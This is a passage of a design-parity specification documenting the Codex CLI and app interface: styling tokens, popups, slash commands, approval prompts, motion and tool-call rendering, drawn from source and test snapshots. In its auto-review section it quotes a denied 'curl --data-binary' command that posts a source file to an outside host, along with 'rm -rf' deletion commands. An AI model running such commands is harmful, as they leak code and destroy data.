| hover (default/ghost) | `background: color-mix(in srgb, var(--foreground) 6%, var(--secondary))`; ghost also `color: var(--foreground)` |
| hover (primary) | `background: color-mix(in srgb, var(--foreground) 80%, transparent)` |
| disabled | `cursor: not-allowed; opacity: 0.4` |
| focus-visible | `outline: 2px solid var(--ring); outline-offset: 2px` |
| selected (`[aria-pressed=true]`, `[aria-selected=true]`, `.is-selected`) | `border-color/background: var(--primary); color: var(--primary-foreground)` |
| selected tile | `border-color: var(--primary); box-shadow: inset 0 0 0 1px var(--primary)` (double-stroke instead of fill) |

Muted text inside a primary button: `color-mix(in srgb, var(--primary-foreground) 50%, transparent)`.

## 6.2 Inputs

`.form-control` (`:463-478`): block, `width: 100%`, `min-height: 28px`, `padding: 0 8px`, `outline: none`, `border: 1px solid var(--input)`, `--radius-lg` + squircle, `color: var(--foreground)`, `background: var(--secondary)`. Placeholder → `--muted-foreground`.

- Focus: `border-color: var(--ring); box-shadow: inset 0 0 0 1px var(--ring)` — **inset ring, not outset** (`:526-529`).
- Disabled: `cursor: not-allowed; opacity: 0.4`.
- `textarea.form-control`: `height: auto; min-height: 72px; padding: 8px 10px; resize: vertical`.
- `input[type=file]`: `padding: 0`, `::file-selector-button` is a 26px inline chip with a right border.
- `input[type=color]`: `40×28px`, `padding: 3px`, swatch radius `calc(--radius-lg - 4px)`.

`.form-select` (`:537-568`): `appearance: none`, `padding: 0 32px 0 8px`, caret drawn as two 4×4 gradient triangles at `calc(100% - 14px)` / `calc(100% - 10px)`.

Checkbox (`:577-619`): 14×14, `--radius-sm` + squircle, `box-shadow: var(--shadow-sm)`, unchecked-hover bg `--card`, checked `border+bg: var(--primary)` with the 12px masked checkmark in `--primary-foreground`. Focus-visible: `outline: 2px solid var(--ring); outline-offset: 2px`.

Radio (`:621-632`): 14×14, `--radius-full`, checked = `2px solid var(--primary)` + `radial-gradient(circle, var(--primary-foreground) 0 2.5px, transparent 3px)`.

Switch (`:659-696`): track `32×20`, `--radius-full`, bg `--muted` → `--primary` when checked. Thumb `16×16` circle, `transform: translate(2px,-50%)` → `translate(14px,-50%)`. **Transitions: `background-color 200ms cubic-bezier(0,0,0.2,1)` on the track, `transform 200ms cubic-bezier(0,0,0.2,1)` on the thumb.** Focus: `box-shadow: 0 0 0 2px var(--ring)`.

Range (`:698-757`): 28px tall, track drawn as a 2px centered gradient of `7% foreground`; thumb `20×20` circle, `1px solid var(--border)`, filled `light-dark(var(--primary-foreground), var(--foreground))`; `accent-color: var(--primary)`.

Generic input transition: `background-color 150ms, border-color 150ms, box-shadow 150ms` on `.form-check-input` (`:587-590`).

## 6.3 Cards, badges, tooltips

- `.card`: `padding: 12px`, `--radius-2xl` (20px) + squircle, `background: var(--card)` (5% fg), `overflow: hidden`, `overflow-wrap: break-word`, `min-width: 0`. **No border, no shadow.**
- `.viz-badge`: `padding: 3px 8px`, `--radius-full`, `background: var(--accent)`, `color: var(--accent-foreground)` (= primary blue on tinted blue), `font-weight: 500`, `--font-size-small`.
- `.tooltip`: `position: fixed; z-index: 50`, `padding: 4px 8px`, `1px solid var(--border)`, `--radius-lg` + squircle, `background: var(--popover)`, **`box-shadow: none`**, tooltip font size/line-height tokens, `pointer-events: none; user-select: none`, `max-width: min(20rem, …)`.
- `.viz-stat` / `.viz-stat-value`: stat value uses `--font-size-h2` at weight 500, `line-height: 1.25`; stack gap 2px.
- `.table`: `border-collapse: collapse`, cell bottom border `1px solid var(--border)`, thead bottom border `color-mix(in srgb, var(--foreground) 16%, transparent)`, last row loses its border, `.table-responsive` wraps with `overflow-x: auto; scrollbar-width: thin`.
- `.sr-only` present — accessibility-aware.

## 6.4 CLI composer / prompt input

**[verified]** Placeholder: **`Ask Codex to do anything`**, prefixed by `› ` (`bottom_pane/snapshots/..._chat_composer__tests__empty.snap`).

Controls reachable from inside the composer (`codex-rs/tui/src/bottom_pane/`, footer snapshots):

| Trigger | Effect |
|---|---|
| `/` | slash-command popup |
| `!` | shell-command mode ("! for shell commands") |
| `@` | file-path / unified mention popup |
| `$` | plugin/skill/app mention (see below) |
| `ctrl + v` | paste images |
| `ctrl + j` (or `shift + enter`) | newline |
| `tab` | queue message / submit message (context-dependent) |
| `ctrl + g` | edit in external editor |
| `esc esc` | edit previous message |
| `ctrl + r` | search history (`reverse-i-search: `) |
| `⌥ + ,` / `⌥ + .` | reasoning effort down / up **(live, from the composer)** |
| `ctrl + t` | view transcript |
| `shift + tab` | cycle collaboration mode (e.g. into **Plan mode**) |
| `?` | toggle shortcut overlay |
| `/keymap` | remap shortcuts |

**[verified]** Model + effort are **not** inline pickers in the CLI composer; they are popups reached via `/model`, and the *current* selection is surfaced in the status line (`gpt-5.6-sol default · /tmp/project`).

**[verified]** Attachments render as **inline text placeholders** inside the buffer, not chips:
- `› [Image #1][Image #2]` (`..._image_placeholder_multiple.snap`)
- `› [Pasted Content 1005 chars]` (`..._large.snap`)

**[verified]** Mention popup with type prefixes (`..._mention_popup_type_prefixes.snap`):

```
› $goog                                                                 
                                                                        
  Google Calendar  [Plugin] Connect Google Calendar for scheduling, ava…
  Google Calendar  [Skill] Find availability and plan event changes     
  Google Calendar  [App] Look up events and availability                
                                                                        
  Press enter to insert or esc to close                                 
```

**[verified]** Unified mention popup with **search-mode tabs** (`..._default_unified_mention_popup.snap`):

```
› @sa                                                                    
                                                                         
> Sample Plugin  Plugin with skills and an MCP server              Plugin
                                                                         
  enter insert · esc close · ←/→ switch search modes  [All Results]   Filesystem Only    Plugins 
```

Note the **selected tab wrapped in `[ ]`** and `←/→` to switch. Selection caret in popups is `>` (or `›` in numbered lists).

## 6.5 CLI popups / selection lists

**[verified]** Canonical structure (from many snapshots):

```
  <Title>
  <optional subtitle / explainer paragraph>

› 1. <Label>   <Description, wrapped and left-aligned to a description column>
  2. <Label>   <Description>

  Press enter to confirm or esc to go back
```

- **[verified]** Selected row marker is **`› `** at column 0, unselected rows are 2-space indented (`popup_consts.rs`, every popup snapshot).
- **[verified]** Rows are **numbered `1.`, `2.`, …** and the number is a hotkey.
- **[verified]** Standard footer, verbatim: **`Press enter to confirm or esc to go back`** (`popup_consts.rs:16-24`). The approval overlay uses a different one: **`Press enter to confirm or esc to cancel`**.
- **[verified]** Label/description two-column layout collapses to stacked rows on narrow terminals (`bottom_pane/selection_row_layout.rs:24 should_stack`, `:171 wrap_stacked_row`).
- **[verified]** Max 8 rows visible, then scroll (`MAX_POPUP_ROWS = 8`).

Live examples, **quote verbatim**:

Model picker (`..._model_selection_popup.snap`):
```
  Select Model and Effort
  Access legacy models by running codex -m <model_name> or in your config.toml

  1. gpt-5.6-sol (default)  Latest frontier agentic coding model.
  2. gpt-5.6-terra          Balanced agentic coding model for everyday work.
  3. gpt-5.6-luna           Fast and affordable agentic coding model.
  4. gpt-5.5                Frontier model for complex coding, research, and
                            real-world work.
› 5. gpt-5.2 (current)      Optimized for professional work and long-running
                            agents.

  Press enter to confirm or esc to go back
```

Reasoning picker (`..._model_reasoning_selection_popup.snap`):
```
  Select Reasoning Level for gpt-5.4

  1. Low               Fast responses with lighter reasoning
  2. Medium (default)  Balances speed and reasoning depth for everyday tasks
› 3. High (current)    Greater reasoning depth for complex problems
  4. Extra high        Extra high reasoning depth for complex problems
  5. More reasoning…   Max and Ultra consume usage limits faster

  Press enter to confirm or esc to go back
```

Personality picker (`..._personality_selection_popup.snap`):
```
  Select Personality
  Choose a communication style for Codex.

  1. Friendly             Warm, collaborative, and helpful.
› 2. Pragmatic (current)  Concise, task-focused, and direct.

  Press enter to confirm or esc to go back
```

> Note the disambiguation convention: **`(default)`** marks the system default, **`(current)`** marks the active selection, and both can appear in one list.

## 6.6 Permissions / approval-mode picker (CLI)

**[verified]** `..._approvals_selection_popup.snap` — quote verbatim:

```
  Update Model Permissions

› 1. Ask for approval  Codex can read and edit files in the current workspace,
                       and run commands. Approval is required to access the
                       internet or edit other files.
  2. Full Access       Codex can edit files outside this workspace and access
                       the internet without asking for approval. Exercise
                       caution when using.

  Press enter to confirm or esc to go back
```

**[verified]** Full-access confirmation gate (`..._full_access_confirmation_popup.snap`) — a **second, destructive-intent modal**:

```
  Enable full access?
  When Codex runs with full access, it can edit any file on your computer and
  run commands with network, without your approval. Exercise caution when
  enabling full access. This significantly increases the risk of data loss,
  leaks, or unexpected behavior.

› 1. Yes, continue anyway  Apply full access for this session
  2. Cancel                Go back without enabling full access

  Press enter to confirm or esc to go back
```

**[verified]** Other permission-mode names present in code: **`Read Only`**, **`Read Only with network access`**, **`Read Only ({approval})`** (`codex-rs/tui/src/status/card.rs:631-669`), **`YOLO mode`** (session header snapshot), and a `writes` app-approval mode added in `rust-v0.144.0` (#30482) — "allows declared read-only actions while prompting for writes."
**[verified]** The permissions preset picker subtitle: **`Switch between Codex approval presets`** (`bottom_pane/list_selection_view.rs:1600`).

## 6.7 Slash-command palette (CLI)

**[verified]** Complete list with **verbatim descriptions** (`codex-rs/tui/src/slash_command.rs:85-142`):

| Command | Description |
|---|---|
| `/feedback` | send logs to maintainers |
| `/new` | start a new chat during a conversation |
| `/init` | create an AGENTS.md file with instructions for Codex |
| `/compact` | summarize conversation to prevent hitting the context limit |
| `/review` | review my current changes and find issues |
| `/rename` | rename the current thread |
| `/resume` | resume a saved chat |
| `/archive` | archive this session and exit |
| `/delete` | permanently delete this session and exit |
| `/clear` | clear the terminal and start a new chat |
| `/fork` | fork the current chat |
| `/app` | continue this session in the Desktop app |
| `/quit`, `/exit` | exit Codex |
| `/copy` | copy last response as markdown |
| `/raw` | toggle raw scrollback mode for copy-friendly terminal selection |
| `/diff` | show git diff (including untracked files) |
| `/mention` | mention a file |
| `/skills` | use skills to improve how Codex performs specific tasks |
| `/import` | import setup, this project, and recent chats from Claude Code |
| `/hooks` | view and manage lifecycle hooks |
| `/status` | show current session configuration and token usage |
| `/usage` | view account usage or use a usage limit reset |
| `/debug-config` | show config layers and requirement sources for debugging |
| `/title` | configure which items appear in the terminal title |
| `/statusline` | configure which items appear in the status line |
| `/theme` | choose a syntax highlighting theme |
| `/pets` | choose or hide the terminal pet |
| `/ps` | list background terminals |
| `/stop` (`/clean`) | stop all background terminals |
| `/model` | choose what model and reasoning effort to use |
| `/personality` | choose a communication style for Codex |
| `/plan` | switch to Plan mode |
| `/goal` | set or view the goal for a long-running task |
| `/agent`, `/subagents` | switch the active agent thread |
| `/side`, `/btw` | (side conversation) |
| `/permissions` | choose what Codex is allowed to do |
| `/keymap` | remap TUI shortcuts |
| `/vim` | toggle Vim mode for the composer |
| `/elevate-sandbox` | set up elevated agent sandbox |
| `/sandbox-add-read-dir` | (add a sandbox read root) |
| `/experimental` | toggle experimental features |
| `/auto-review` | approve one retry of a recent auto-review denial |
| `/memories` | configure memory use and generation |
| `/mcp` | list configured MCP tools; use /mcp verbose for details |
| `/apps` | manage apps |
| `/plugins` | browse plugins |
| `/logout` | log out of Codex |
| `/rollout` | print the rollout file path |
| `/approve` | (approve a pending request) |
| `/setup-default-sandbox` | (sandbox setup) |

## 6.8 Terminal styling / code blocks

- **[verified]** Code blocks in the CLI are **never word-wrapped** (`markdown_render.rs` test `does_not_wrap_code_blocks`). Fenced blocks keep their ``` fences visible in nested cases; indented blocks keep 4-space indentation (`..._chatwidget_markdown_code_blocks_vt100_snapshot.snap`).
- **[verified]** Markdown tables render with a heavy rule: `━━━━━━  ━━━━━━━` (`..._raw_mode_toggle_transcript.snap`).
- **[verified]** Inline code = cyan; on the web surface, inline code = `--muted` (10% fg) background, 7.5px squircle radius, `0.92em`, `box-decoration-break: clone` so wrapped inline code keeps its pill shape on every line.

---

# 7. States

## 7.1 Web/app (from `visualize.css`)

| State | Treatment |
|---|---|
| **hover** | surfaces lift by `color-mix(in srgb, var(--foreground) 6%, var(--secondary))`; ghost buttons additionally promote text `--muted-foreground` → `--foreground`; primary buttons *fade* to 80% instead of lifting |
| **focus-visible** | buttons/checkbox/radio: `outline: 2px solid var(--ring); outline-offset: 2px`. Text inputs/selects: `border-color: var(--ring)` + `box-shadow: inset 0 0 0 1px var(--ring)`. Switch: `box-shadow: 0 0 0 2px var(--ring)`. **Focus is `:focus-visible` only — never `:focus`.** |
| **active/selected** | `[aria-pressed=true] / [aria-selected=true] / .is-selected` → filled with `--primary`; tile variant uses an inset 1px `--primary` ring instead |
| **disabled** | `opacity: 0.4` + `cursor: not-allowed` (switch uses `opacity: 0.6`); `pointer-events: none` on disabled checkbox; disabled label inherits `not-allowed` |
| **link hover/focus** | `text-decoration-line: underline; text-decoration-style: dashed; text-decoration-thickness: 0.5px; text-underline-offset: 2px` — **dashed 0.5px underline is a distinctive Codex detail** |
| **loading** | no skeleton/spinner classes exist in this stylesheet — **[unknown]** for app chrome |
| **empty** | no empty-state classes — **[unknown]** for app chrome |

## 7.2 CLI states

| State | Rendering |
|---|---|
| Tool queued | *(no distinct queued state; cells appear when the call starts)* |
| Tool running | shimmering `•` + bold present-tense verb (`Running`, `Exploring`, `Calling`, `Searching the web`) |
| Tool success | green bold `•` + bold past-tense verb (`Ran`, `Explored`, `Called`, `Searched the web`) |
| Tool failed | red bold `•`; in transcript, a trailing `✗ (exit) • {duration}` line |
| Interrupted exec | rendered as a completed `Ran` cell (marked failed internally) — `..._interrupt_exec_marks_failed.snap` |
| Empty output | literal **`(no output)`**, dim, under `  └ ` |
| Truncated output | `… +{n} lines (ctrl + t to view transcript)` |
| Queued user input | `• Queued follow-up inputs` then `  ↳ <text>` per message |
| Disabled slash command while running | snapshot `..._disabled_slash_command_while_task_running_snapshot.snap` |
| Empty agent list | `No agents completed yet` |
| Empty branch list (in `/review` picker) | aligned with search message (release `rust-v0.144.0`, #31465) |

---

# 8. Motion

## 8.1 Web/app

**[verified]** Only three transitions exist in `visualize.css` — the motion language is deliberately minimal:

```css
/* switch track */  transition: background-color 200ms cubic-bezier(0, 0, 0.2, 1);
/* switch thumb  */ transition: transform        200ms cubic-bezier(0, 0, 0.2, 1);
/* check inputs  */ transition: background-color 150ms, border-color 150ms, box-shadow 150ms;
```

- **[verified]** Easing is **`cubic-bezier(0, 0, 0.2, 1)`** — Material's *decelerate / ease-out* curve.
- **[verified]** Durations: **150ms** for color/border/shadow state changes, **200ms** for positional (thumb travel) changes.
- **[verified]** No `prefers-reduced-motion` block in this stylesheet — **[inferred]** reduced motion is handled at the app level, mirroring the CLI's `tui.animations` flag.

## 8.2 CLI — the shimmer status line (distinctive; describe exactly)

**[verified]** `codex-rs/tui/src/shimmer.rs`, `motion.rs`, `status_indicator_widget.rs`.

**The status header text has a light band sweeping left→right across its characters, continuously.**

Exact algorithm (`shimmer.rs:21-69`):

1. `padding = 10` characters on each side; `period = text.len() + 2*padding`.
2. `sweep_seconds = 2.0` — **one full sweep every 2 seconds**, phase-locked to a process-global `Instant` (`PROCESS_START`), so *all* shimmering elements are synchronized.
3. Position `pos = (elapsed % 2.0) / 2.0 * period`.
4. `band_half_width = 5.0` characters.
5. For char *i* at distance `d = |i + padding - pos|`:
   - if `d <= 5.0`: `t = 0.5 * (1 + cos(π * d / 5.0))` → **raised-cosine (Hann) falloff**, `t ∈ [0,1]`
   - else `t = 0`
6. Truecolor: `fg = blend(default_bg, default_fg, t * 0.9)` — **the highlight pulls the text toward the terminal background at up to 90%**, plus `Modifier::BOLD` on every character.
7. Non-truecolor fallback (`shimmer.rs:71-80`): `t < 0.2` → `DIM`; `0.2 ≤ t < 0.6` → normal; `t ≥ 0.6` → `BOLD`.

**Activity bullet** (`motion.rs:62-76`):
- truecolor → the `•` glyph itself is run through `shimmer_spans("•")`.
- otherwise → **blinks between `•` and dim `◦` every 600 ms** (`(elapsed_ms / 600) % 2 == 0`).

**Frame rate** (`status_indicator_widget.rs:243-247`): while animating, the widget schedules the next frame in **32 ms (~31 fps)**.

**Reduced motion** (`motion.rs:29-60`): `MotionMode::Reduced` — the activity indicator becomes either **hidden** or a **static dim `•`** (caller chooses via `ReducedMotionIndicator::Hidden | StaticBullet`), and `shimmer_text` degrades to plain unstyled text. Gated by config **`[tui] animations`** (default `true`) — *"Enable animations (welcome screen, shimmer effects, spinners)"* (`codex-rs/config/src/types.rs:696-699`).

**Architectural note:** there is a **compile-time lint test** (`motion.rs:121-167`) that fails the build if any file other than `motion.rs`/`shimmer.rs` calls `spinner(...)` or `shimmer_spans(...)` directly — all motion must route through the `motion` module so the reduced-motion fallback is always explicit. Worth copying.

## 8.3 Streaming text behaviour

- **[verified]** Assistant text streams as **incremental markdown** — `codex-rs/tui/src/markdown_stream.rs`, `chatwidget/streaming.rs`. Release `rust-v0.145.0` explicitly cites *"incremental Markdown rendering, fewer redraws, caching, and bounded command output"* for long conversations.
- **[verified]** Completed lines are **committed into terminal scrollback** (`insert_history.rs`) rather than repainted, which is why the CLI can stay responsive on very long transcripts.
- **[verified]** Empty reasoning summaries are hidden (`rust-v0.145.0` changelog, #31652 "fix(tui): hide empty reasoning summaries").
- **[verified]** Turn duration timer pauses/resumes (`pause_timer` / `resume_timer`, `status_indicator_widget.rs:159-182`) so the `(Ns • …)` counter excludes time spent waiting on the user.

## 8.4 Welcome animation

- **[verified]** `codex-rs/tui/src/ascii_animation.rs` + `onboarding/welcome.rs`: an ASCII animation plays on the welcome screen when `animations_enabled`. Minimum viewport for it: **37 rows × 60 cols** (`MIN_ANIMATION_HEIGHT = 37`, `MIN_ANIMATION_WIDTH = 60`, `welcome.rs:23-24`). Pressing **`.`** rotates to a random animation variant (`welcome.rs:38-46`).

## 8.5 Terminal pets

- **[verified]** `codex-rs/tui/src/pets/` — an ambient animated companion, selectable via `/pets`. Its catalog is *"ported from the Codex App avatar catalog"* (`pets/catalog.rs:1`), so **the desktop app has an equivalent avatar/mascot system**. Pet states include `Running` (label "Running") and a `Thinking` label (`pets/ambient.rs:66-75`).

---

# 9. Microcopy & tone

All strings below are **[verified] verbatim** from source or committed snapshots.

## 9.1 Status line

Format (`status_indicator_widget.rs:253-282`):
```
<indicator> <shimmering header> (<elapsed> • <key> to interrupt)[ · <inline message>]
```
Concrete: `• Working (0s • esc to interrupt)`

- Default header: **`Working`** (`status_indicator_widget.rs:46, 87`; `chatwidget/status_state.rs:15`).
- Observed alternate headers: **`Analyzing`**, **`Investigating rendering code`**, **`Reviewing approval request`**, **`Reviewing {n} approval requests`** (`chatwidget/status_state.rs:98-100`).
- Without an interrupt binding, the suffix collapses to just `(0s)`.
- Elapsed format (`fmt_elapsed_compact`, tests at `:314-325`): `0s`, `1s`, `59s`, `1m 00s`, `1m 01s`, `3m 05s`, `59m 59s`, `1h 00m 00s`, `1h 01m 01s`, `25h 02m 03s`.
- Details rows hang under `  └ `, max 3 lines, then the last line is hard-truncated with `…`.

## 9.2 Composer & footer

- Placeholder: **`Ask Codex to do anything`**
- Status line (right/below composer): `gpt-5.6-sol default · /tmp/project`; with more items: `gpt-5.4 xhigh fast · Context 100% left · /tmp/project`
- Footer idle: `? for shortcuts` … `100% context left`
- Footer with tokens: `? for shortcuts` … `123K used`
- Footer with mode: `? for shortcuts · Plan mode (shift+tab to cycle)` … `100% context left`
- Footer running: `tab to queue message` … `100% context left`
- Quit confirm: **`ctrl + c again to quit`**
- Backtrack hint: **`esc esc to edit previous message`**
- History search prompt: **`reverse-i-search: `**
- Shortcut overlay footer: **`customize shortcuts with /keymap`**

**[verified]** Full shortcut overlay, two-column, verbatim (`..._footer_shortcuts_running.snap` / `..._footer_mode_shortcut_overlay.snap`):

```
  / for commands                             ! for shell commands               
  ctrl + j for newline                       tab to queue message               
  @ for file paths                           ctrl + v to paste images           
  ctrl + g to edit in external editor        esc esc to edit previous message   
  ctrl + r search history                    ctrl + c to interrupt              
  ⌥ + , reasoning down                       ⌥ + . reasoning up                 
  ctrl + t to view transcript                                                   
                                                                                
  customize shortcuts with /keymap                                              
```

Idle variant differs in three cells: `shift + enter for newline`, `tab to submit message`, `esc again to edit previous message`, `ctrl + c to exit`.

**[verified]** Key-hint prefixes (`codex-rs/tui/src/key_hint.rs:26-32`): `⌥ + ` on macOS *and* Windows, `alt + ` on Linux; `ctrl + `; `shift + `. Note the **spaces around `+`**.

## 9.3 Approval prompts — exact option lists

**[verified]** Exec approval (`..._approval_modal_exec.snap`):
```
  Would you like to run the following command?

  Reason: this is a test reason such as one that would be produced by the model

  $ echo hello world

› 1. Yes, proceed (y)
  2. Yes, and don't ask again for commands that start with `echo hello world` (p)
  3. No, and tell Codex what to do differently (esc)

  Press enter to confirm or esc to cancel
```

**[verified]** Patch/edit approval (`..._approval_modal_patch.snap`):
```
  Would you like to make the following edits?

  Reason: The model wants to apply changes

› 1. Yes, proceed (y)
  2. Yes, and don't ask again for these files (a)
  3. No, and tell Codex what to do differently (esc)

  Press enter to confirm or esc to cancel
```

**[verified]** Network approval (`..._network_exec_prompt.snap`):
```
  Do you want to approve network access to "example.com"?

  Reason: network request blocked

› 1. Yes, just this once (y)
  2. Yes, and allow this host for this conversation (a)
  3. Yes, and allow this host in the future (p)
  4. No, and tell Codex what to do differently (esc)

  Press enter to confirm or esc to cancel
```
Style data in that snapshot confirms: title row is **BOLD**, the `Reason:` value is **ITALIC**, the selected row `› 1.` is **Cyan + BOLD**, the `(y)` / `(a)` / `(p)` key hints are **DIM**, the footer line is **DIM**.

**[verified]** Permissions grant (`..._approval_overlay_permissions_prompt.snap`):
```
  Would you like to grant these permissions?

  Reason: need workspace access

  Permission rule: network; read `/tmp/readme.txt`; write `/tmp/out.txt`

› 1. Yes, grant these permissions for this turn (y)
  2. Yes, grant for this turn with strict auto review (r)
  3. Yes, grant these permissions for this session (a)
  4. No, continue without permissions (d)

  Press enter to confirm or esc to cancel
```
`Permission rule:` value renders **cyan** (`approval_overlay.rs:695-700`).

**[verified]** Additional option labels present in code (`approval_overlay.rs`):
- `Yes, and allow these permissions for this session`
- `Yes, and don't ask again for this command in this session`
- `No, and block this host in the future`
- `No, continue without running it`
- `Yes, and don't ask again for these files`
- `Yes, grant for this turn with strict auto review`
- MCP elicitation: `Yes, provide the requested info` / `No, but continue without it` / `Cancel this request`
- MCP elicitation title: `{server_name} needs your approval.` with a `Server: {name}` header row.

**[verified]** Header rows that can precede the question, in order: `Thread: {label}`, `Environment: {id}`, `Reason: {italic}`, `Permission rule: {cyan}`, then `$ {highlighted command}` (`approval_overlay.rs:670-740`).

## 9.4 Approval decision receipts (post-hoc transcript lines)

**[verified]** `codex-rs/tui/src/history_cell/approvals.rs`. Pattern: `{glyph}{Subject} {bolded verb} {object} {bolded scope}`.

- `✔ You approved codex to run <cmd> this time`
- `✔ You approved codex to run <cmd> every time this session`
- `` ✔ You approved codex to always run commands that start with `<prefix>` ``
- `✔ You approved codex network access to <target> this time`
- `✔ You persisted Codex network access to <target>`
- `✗ You denied codex network access to <target> and saved that rule`
- `✗ You did not approve codex to run <cmd>`
- `✗ Request denied for codex to run <cmd>` *(when the actor is the Guardian auto-reviewer rather than the user)*

Command snippets are truncated to **80 graphemes**, and multi-line commands become `{first line} ...` (`approvals.rs:5-12`).

## 9.5 Guardian / auto-review

**[verified]** (`..._guardian_denied_exec_renders_warning_and_denied_request.snap`):
```
⚠ Automatic approval review denied (risk: high): The planned action would
  transmit the full contents of a workspace source file (`core/src/codex.rs`) to
  `https://example.com`, which is an external and untrusted endpoint.

✗ Request denied for codex to run curl -sS -i -X POST --data-binary
  @core/src/codex.rs https://example.com
```
**Note the explicit `(risk: high)` label.**

**[verified]** Aggregate parallel review status (`..._guardian_parallel_reviews_render_aggregate_status.snap`):
```
• Reviewing 2 approval requests (0s • esc to interrupt)
  └ • rm -rf '/tmp/guardian target 1'
    • rm -rf '/tmp/guardian target 2'
```

## 9.6 Errors, interruptions, empty states

- **[verified]** Interruption: **`■ Conversation interrupted - tell the model what to do differently. Something went wrong? Hit `/feedback` to report the issue.`**
- **[verified]** Oversized input: **`■ Message exceeds the maximum length of 1048576 characters (1048577 provided).`**
- **[verified]** Safety/policy block:
  ```
  ⓘ This content can't be shown
    We take extra caution with requests involving biological research and
    applications that could pose safety risks. Eligible researchers can apply
    for Trusted Access.
    Trusted Access: https://www.openai.com/form/trusted-access-for-biology-
    research/
    Learn more: https://help.openai.com/en/articles/20001326
  ```
- **[verified]** Empty exec output: **`(no output)`**
- **[verified]** Empty agent list: **`No agents completed yet`**
- **[verified]** Desktop-app launch failure: **`Failed to open this session in the Desktop app: {err}. Install or launch the Desktop app and try again.`**
- **[verified]** Trust prompt (onboarding):
  ```
  > You are in /workspace/project

    Do you trust the contents of this directory? Working with untrusted
    contents comes with higher risk of prompt injection. Trusting the
    directory allows project-local config, hooks, and exec policies to
    load.

  › 1. Yes, continue                                                    
    2. No, quit

    Press enter to continue
  ```
- **[verified]** Sign-in: **`Finish signing in via your browser`** / **`If the link doesn't open automatically, open the following link to authenticate:`** / **`On a remote or headless machine? Press esc and choose Sign in with Device Code.`** / **`Press esc to cancel`**
- **[verified]** Plan-mode nudge (an inline suggestion strip above the composer): **`Create a plan?  shift + tab use Plan mode   esc dismiss`**

## 9.7 Desktop notifications

**[verified]** `codex-rs/tui/src/chatwidget/notifications.rs:36-64` — messages sent to the OS:

| Event | Message |
|---|---|
| Turn complete | first ~line of the response, else fallback **`Agent turn complete`** |
| Exec approval needed | `Approval requested: {command truncated to 30 graphemes}` |
| Edit approval needed | `Codex wants to edit {path}` or `Codex wants to edit {n} files` |
| MCP elicitation | `Approval requested by {server_name}` |
| Plan mode prompt | `Plan mode prompt: {title}` |

**[verified]** Coalescing: only one pending notification at a time; higher-priority events win (`notifications.rs:6-17`). Priority ordering puts `AgentTurnComplete` at 0 (lowest).
**[verified]** Delivery: **OSC 9** where supported (Ghostty, iTerm2, Kitty, Warp, WezTerm, …), else **BEL** (`notifications/mod.rs:20-60`). tmux gets DCS passthrough wrapping (`osc9.rs:22-26`).
**[verified]** Config: `tui.notifications` (default on), `tui.notification_method` = `auto|osc9|bel`, `tui.notification_condition` = `unfocused` (default) | always (`codex-rs/config/src/types.rs:660-676`).

## 9.8 Tone

**[inferred, strongly supported]** House style, derived from every string above:
- Sentence case everywhere; Title Case only for popup titles (`Select Model and Effort`, `Update Model Permissions`, `Enable full access?`).
- Second person, addressed to the user (`Would you like to…`, `Do you trust…`, `You approved…`).
- The agent is referred to in lower case as **`codex`** inside sentences (`approved codex to run …`) but **`Codex`** when it's the subject of a product statement (`Codex can read and edit files…`, `tell Codex what to do differently`).
- Options always lead with **`Yes,`** / **`No,`** so the outcome is readable before the qualifier.
- Consequences are stated plainly and without hedging: *"This significantly increases the risk of data loss, leaks, or unexpected behavior."*
- Every truncation names its escape hatch: `(ctrl + t to view transcript)`.
- Typographic apostrophes/quotes are used in prose (`I'm going to…`, `"Change Approved"`), straight quotes in code.

---

# 10. TOOL-CALL / AGENT-ACTION RENDERING (deepest pass)

This is the heart of the parity work. Everything in §10 is **[verified]** from `codex-rs/tui/src/exec_cell/`, `history_cell/`, `diff_render.rs` and their committed snapshots, unless marked otherwise.

## 10.1 The universal cell grammar

**Every** agent action renders as the same shape — an **inline block, not a card**:

```
<glyph> <BOLD VERB> <subject>
  │ <command continuation, max 2 lines>
  └ <result / detail, max 5 lines>
    <more detail>
```

Formally:

| Column | Content |
|---|---|
| 0 | status glyph — `•` (dim / shimmer / green-bold / red-bold), or `✔`/`✗`/`⚠`/`■`/`ⓘ` for non-tool cells |
| 1 | space |
| 2… | **bold verb** (`Ran`, `Explored`, `Called`, `Edited`, `Searched the web`, `Updated Plan`, …) |
| then | space + subject (command, path, tool name, query) |

Continuation and detail lines use fixed 4-column prefixes: `"  │ "` for command overflow, `"  └ "` for the first detail line, `"    "` for subsequent detail lines.

**There are no boxes, no cards, no borders, no background fills on tool cells.** Only the session header uses a box. This is the strongest single stylistic signal of Codex's transcript.

## 10.2 Verb table — announcing a call

| Tool / action | Running (present) | Finished (past) | Source |
|---|---|---|---|
| Shell command | **`Running`** | **`Ran`** | `exec_cell/render.rs:369-374` |
| Shell command the *user* typed (`!`) | — | **`You ran`** | `render.rs:371` |
| Read/list/search cluster | **`Exploring`** | **`Explored`** | `render.rs:265-268` |
| MCP tool | **`Calling`** | **`Called`** | `history_cell/mcp.rs:133-135, 216-218` |
| Web search | **`Searching the web`** | **`Searched the web for {query}`** | `history_cell/search.rs:7-9` |
| File edit | — | **`Edited`** / **`Added`** / **`Deleted`** / **`Edited {n} files`** | `diff_render.rs:428-441` |
| Proposed (unapplied) edit | — | **`Proposed Change {path} (+a -b)`** | snapshot `..._vertical_ellipsis_between_hunks.snap` |
| Plan | — | **`Proposed Plan`** / **`Updated Plan`** | `history_cell/plans.rs:111, 204` |
| Image generation | — | **`Generated Image:`** / `✗ **Image generation failed**` | `..._image_generation_call_history_snapshot.snap`, `history_cell/patches.rs:83` |
| Image view | — | **`Viewed Image`** | `history_cell/patches.rs:68` |
| Background terminal | — | **`Waited for background terminal`** / **`Interacted with background terminal`** | `history_cell/exec.rs:29-31` |
| Lifecycle hook | `Running {label} hook` / `Running {n} {label} hooks` | `{HookName} ({status})` | `history_cell/hook_cell.rs:450, 737-739` |
| Structured questions | — | **`Questions`** | `history_cell/request_user_input.rs:28` |

**Exploring sub-verbs** (rendered **cyan**, one per line under `└`) — `render.rs:293-332`:

| ParsedCommand | Label | Payload |
|---|---|---|
| `Read` | `Read` | file name(s), comma-joined with **dim commas** |
| `ListFiles` | `List` | path, else the raw command |
| `Search` | `Search` | `{query}` + **dim** ` in ` + `{path}` when both known |
| `Unknown` | `Run` | raw command |

## 10.3 Command execution blocks

**[verified]** Live examples:

```
• Ran echo ok
  └ (no output)
```

```
• Ran set -o pipefail
  │ cargo test -p codex-tui
  │ --quiet
  └ (no output)
```

```
• Ran a_very_long_token_
  │ without_spaces_to_
  │ force_wrapping
  └ (no output)
```

```
• Ran echo
